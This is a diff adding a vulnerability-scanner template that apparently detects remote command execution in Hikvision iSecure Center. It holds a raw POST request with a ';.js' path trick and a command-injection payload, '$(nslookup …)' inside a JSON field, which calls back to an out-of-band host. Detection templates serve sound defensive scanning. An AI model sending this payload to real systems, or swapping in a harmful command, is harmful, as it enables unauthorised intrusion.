@@ -1,0 +1,28 @@
+id: poc-yaml-safetrolley-installation-detection-rce
+info:
+  name: Hikvision Installation Detection Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,dns
+  description: |
+    This template detects potential remote command execution vulnerabilities in the Hikvision iSecure Center platform.
+
+http:
+  - raw:
+      - |
+        POST /center/api/installation/detection;.js HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"type": "environment", "operate": "", "machines": {"id": "$(nslookup {{interactsh-url}})"}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: word
+        part: header
+        words:
+          - "application/json"
